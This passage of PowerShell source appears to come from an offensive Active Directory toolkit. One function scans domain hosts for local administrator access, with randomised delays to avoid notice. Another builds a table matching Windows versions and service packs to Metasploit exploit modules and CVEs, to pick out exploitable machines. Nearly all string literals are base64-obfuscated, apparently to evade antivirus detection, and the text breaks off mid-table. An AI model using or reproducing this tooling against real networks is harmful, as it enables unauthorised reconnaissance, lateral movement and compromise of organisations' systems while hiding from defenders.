        [String]
        $ComputerFile,

        [String]
        $ComputerFilter,

        [String]
        $ComputerADSpath,

        [Switch]
        $NoPing,

        [UInt32]
        $Delay = 0,

        [Double]
        $Jitter = .3,

        [String]
        $Domain,

        [String]
        $DomainController,

        [Switch]
        $SearchForest,

        [ValidateRange(1,100)] 
        [Int]
        $Threads
    )

    begin {
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVidWc=")))]) {
            $DebugPreference = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29udGludWU=")))
        }

        
        $RandNo = New-Object System.Random

        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WypdIFJ1bm5pbmcgRmluZC1Mb2NhbEFkbWluQWNjZXNzIHdpdGggZGVsYXkgb2YgJERlbGF5")))
        
        if(!$ComputerName) {
            if($Domain) {
                $TargetDomains = @($Domain)
            }
            elseif($SearchForest) {
                
                $TargetDomains = Get-NetForestDomain | ForEach-Object { $_.Name }
            }
            else {
                
                $TargetDomains = @( (Get-NetDomain).name )
            }

            
            if($ComputerFile) {
                $ComputerName = Get-Content -Path $ComputerFile
            }
            else {
                [array]$ComputerName = @()
                ForEach ($Domain in $TargetDomains) {
                    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WypdIFF1ZXJ5aW5nIGRvbWFpbiAkRG9tYWluIGZvciBob3N0cw==")))
                    $ComputerName += Get-NetComputer -Filter $ComputerFilter -ADSpath $ComputerADSpath -Domain $Domain -DomainController $DomainController
                }
            }

            
            $ComputerName = $ComputerName | Where-Object { $_ } | Sort-Object -Unique | Sort-Object { Get-Random }
            if($($ComputerName.Count) -eq 0) {
                throw ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tm8gaG9zdHMgZm91bmQh")))
            }
        }

        
        $HostEnumBlock = {
            param($ComputerName, $Ping)

            $Up = $True
            if($Ping) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
            }
            if($Up) {
                
                $Access = Invoke-CheckLocalAdminAccess -ComputerName $ComputerName
                if ($Access) {
                    $ComputerName
                }
            }
        }

    }

    process {

        if($Threads) {
            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNpbmcgdGhyZWFkaW5nIHdpdGggdGhyZWFkcyA9ICRUaHJlYWRz")))

            
            $ScriptParams = @{
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UGluZw=="))) = $(-not $NoPing)
            }

            
            Invoke-ThreadedFunction -ComputerName $ComputerName -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams
        }

        else {
            if(-not $NoPing -and ($ComputerName.count -ne 1)) {
                
                $Ping = {param($ComputerName) if(Test-Connection -ComputerName $ComputerName -Count 1 -Quiet -ErrorAction Stop){$ComputerName}}
                $ComputerName = Invoke-ThreadedFunction -NoImports -ComputerName $ComputerName -ScriptBlock $Ping -Threads 100
            }

            Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WypdIFRvdGFsIG51bWJlciBvZiBhY3RpdmUgaG9zdHM6IHswfQ=="))) -f $($ComputerName.count))
            $Counter = 0

            ForEach ($Computer in $ComputerName) {

                $Counter = $Counter + 1

                
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WypdIEVudW1lcmF0aW5nIHNlcnZlciAkQ29tcHV0ZXIgKCRDb3VudGVyIG9mIHswfSk="))) -f $($ComputerName.count))
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $Computer, $False, $OutFile, $DomainSID, $TrustGroupsSIDs
            }
        }
    }
}


function Get-ExploitableSystem {

    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        $ComputerName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Kg=="))),

        [String]
        $SPN,

        [String]
        $OperatingSystem = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Kg=="))),

        [String]
        $ServicePack = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Kg=="))),

        [String]
        $Filter,

        [Switch]
        $Ping,

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [Switch]
        $Unconstrained,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    Write-Verbose "[*] Grabbing computer accounts from Active Directory..."

    
    $TableAdsComputers = New-Object System.Data.DataTable 
    $Null = $TableAdsComputers.Columns.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SG9zdG5hbWU="))))       
    $Null = $TableAdsComputers.Columns.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3BlcmF0aW5nU3lzdGVt"))))
    $Null = $TableAdsComputers.Columns.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmljZVBhY2s="))))
    $Null = $TableAdsComputers.Columns.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TGFzdExvZ29u"))))

    Get-NetComputer -FullData @PSBoundParameters | ForEach-Object {

        $CurrentHost = $_.dnshostname
        $CurrentOs = $_.operatingsystem
        $CurrentSp = $_.operatingsystemservicepack
        $CurrentLast = $_.lastlogon
        $CurrentUac = $_.useraccountcontrol

        $CurrentUacBin = [convert]::ToString($_.useraccountcontrol,2)

        
        $DisableOffset = $CurrentUacBin.Length - 2
        $CurrentDisabled = $CurrentUacBin.Substring($DisableOffset,1)

        
        if ($CurrentDisabled  -eq 0) {
            
            $Null = $TableAdsComputers.Rows.Add($CurrentHost,$CurrentOS,$CurrentSP,$CurrentLast)
        }
    }

    
    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WypdIExvYWRpbmcgZXhwbG9pdCBsaXN0IGZvciBjcml0aWNhbCBtaXNzaW5nIHBhdGNoZXMuLi4=")))

    
    
    

    
    $TableExploits = New-Object System.Data.DataTable 
    $Null = $TableExploits.Columns.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3BlcmF0aW5nU3lzdGVt")))) 
    $Null = $TableExploits.Columns.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmljZVBhY2s="))))
    $Null = $TableExploits.Columns.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TXNmTW9kdWxl"))))  
    $Null = $TableExploits.Columns.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q1ZF"))))
    
    
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyA3"))),"",([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL3NtYi9tczEwXzA2MV9zcG9vbHNz"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAxMC0yNzI5"))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBTZXJ2ZXIgMjAwMA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyIFBhY2sgMQ=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL2RjZXJwYy9tczAzXzAyNl9kY29t"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwMy0wMzUyLw=="))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBTZXJ2ZXIgMjAwMA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyIFBhY2sgMQ=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL2RjZXJwYy9tczA1XzAxN19tc21x"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwNS0wMDU5"))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBTZXJ2ZXIgMjAwMA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyIFBhY2sgMQ=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL2lpcy9tczAzXzAwN19udGRsbF93ZWJkYXY="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwMy0wMTA5"))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBTZXJ2ZXIgMjAwMA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyIFBhY2sgMQ=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL3dpbnMvbXMwNF8wNDVfd2lucw=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwNC0xMDgwLw=="))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBTZXJ2ZXIgMjAwMA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmljZSBQYWNrIDI="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL2RjZXJwYy9tczAzXzAyNl9kY29t"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwMy0wMzUyLw=="))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBTZXJ2ZXIgMjAwMA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmljZSBQYWNrIDI="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL2RjZXJwYy9tczA1XzAxN19tc21x"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwNS0wMDU5"))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBTZXJ2ZXIgMjAwMA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmljZSBQYWNrIDI="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL2lpcy9tczAzXzAwN19udGRsbF93ZWJkYXY="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwMy0wMTA5"))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBTZXJ2ZXIgMjAwMA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmljZSBQYWNrIDI="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL3NtYi9tczA0XzAxMV9sc2Fzcw=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwMy0wNTMzLw=="))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBTZXJ2ZXIgMjAwMA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmljZSBQYWNrIDI="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL3dpbnMvbXMwNF8wNDVfd2lucw=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwNC0xMDgwLw=="))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBTZXJ2ZXIgMjAwMA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmljZSBQYWNrIDM="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL2RjZXJwYy9tczAzXzAyNl9kY29t"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwMy0wMzUyLw=="))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBTZXJ2ZXIgMjAwMA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmljZSBQYWNrIDM="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL2RjZXJwYy9tczA1XzAxN19tc21x"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwNS0wMDU5"))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBTZXJ2ZXIgMjAwMA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmljZSBQYWNrIDM="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL2lpcy9tczAzXzAwN19udGRsbF93ZWJkYXY="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwMy0wMTA5"))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBTZXJ2ZXIgMjAwMA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmljZSBQYWNrIDM="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL3dpbnMvbXMwNF8wNDVfd2lucw=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwNC0xMDgwLw=="))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBTZXJ2ZXIgMjAwMA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmljZSBQYWNrIDQ="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL2RjZXJwYy9tczAzXzAyNl9kY29t"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwMy0wMzUyLw=="))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBTZXJ2ZXIgMjAwMA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmljZSBQYWNrIDQ="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL2RjZXJwYy9tczA1XzAxN19tc21x"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwNS0wMDU5"))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBTZXJ2ZXIgMjAwMA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmljZSBQYWNrIDQ="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL2RjZXJwYy9tczA3XzAyOV9tc2Ruc196b25lbmFtZQ=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwNy0xNzQ4"))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBTZXJ2ZXIgMjAwMA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmljZSBQYWNrIDQ="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL3NtYi9tczA0XzAxMV9sc2Fzcw=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwMy0wNTMzLw=="))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBTZXJ2ZXIgMjAwMA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmljZSBQYWNrIDQ="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL3NtYi9tczA2XzA0MF9uZXRhcGk="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwNi0zNDM5"))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBTZXJ2ZXIgMjAwMA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmljZSBQYWNrIDQ="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL3NtYi9tczA2XzA2Nl9ud2FwaQ=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwNi00Njg4"))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBTZXJ2ZXIgMjAwMA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmljZSBQYWNrIDQ="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL3NtYi9tczA2XzA3MF93a3NzdmM="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwNi00Njkx"))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBTZXJ2ZXIgMjAwMA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmljZSBQYWNrIDQ="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL3NtYi9tczA4XzA2N19uZXRhcGk="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwOC00MjUw"))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBTZXJ2ZXIgMjAwMA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmljZSBQYWNrIDQ="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL3dpbnMvbXMwNF8wNDVfd2lucw=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwNC0xMDgwLw=="))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBTZXJ2ZXIgMjAwMA=="))),"",([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL2RjZXJwYy9tczAzXzAyNl9kY29t"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwMy0wMzUyLw=="))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBTZXJ2ZXIgMjAwMA=="))),"",([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL2RjZXJwYy9tczA1XzAxN19tc21x"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwNS0wMDU5"))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBTZXJ2ZXIgMjAwMA=="))),"",([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL2lpcy9tczAzXzAwN19udGRsbF93ZWJkYXY="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwMy0wMTA5"))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBTZXJ2ZXIgMjAwMA=="))),"",([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL3NtYi9tczA1XzAzOV9wbnA="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwNS0xOTgz"))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBTZXJ2ZXIgMjAwMA=="))),"",([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL3dpbnMvbXMwNF8wNDVfd2lucw=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwNC0xMDgwLw=="))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBTZXJ2ZXIgMjAwMw=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyIFBhY2sgMQ=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL2RjZXJwYy9tczA3XzAyOV9tc2Ruc196b25lbmFtZQ=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwNy0xNzQ4"))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBTZXJ2ZXIgMjAwMw=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyIFBhY2sgMQ=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL3NtYi9tczA2XzA0MF9uZXRhcGk="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwNi0zNDM5"))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBTZXJ2ZXIgMjAwMw=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyIFBhY2sgMQ=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL3NtYi9tczA2XzA2Nl9ud2FwaQ=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwNi00Njg4"))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBTZXJ2ZXIgMjAwMw=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyIFBhY2sgMQ=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL3NtYi9tczA4XzA2N19uZXRhcGk="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwOC00MjUw"))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBTZXJ2ZXIgMjAwMw=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyIFBhY2sgMQ=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL3dpbnMvbXMwNF8wNDVfd2lucw=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwNC0xMDgwLw=="))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBTZXJ2ZXIgMjAwMw=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmljZSBQYWNrIDI="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL2RjZXJwYy9tczA3XzAyOV9tc2Ruc196b25lbmFtZQ=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwNy0xNzQ4"))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBTZXJ2ZXIgMjAwMw=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmljZSBQYWNrIDI="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL3NtYi9tczA4XzA2N19uZXRhcGk="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwOC00MjUw"))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBTZXJ2ZXIgMjAwMw=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmljZSBQYWNrIDI="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL3NtYi9tczEwXzA2MV9zcG9vbHNz"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAxMC0yNzI5"))))  
    $Null = $TableExploits.Rows.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luZG93cyBTZXJ2ZXIgMjAwMw=="))),"",([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXhwbG9pdC93aW5kb3dzL2RjZXJwYy9tczAzXzAyNl9kY29t"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwMy0wMzUyLw=="))))  
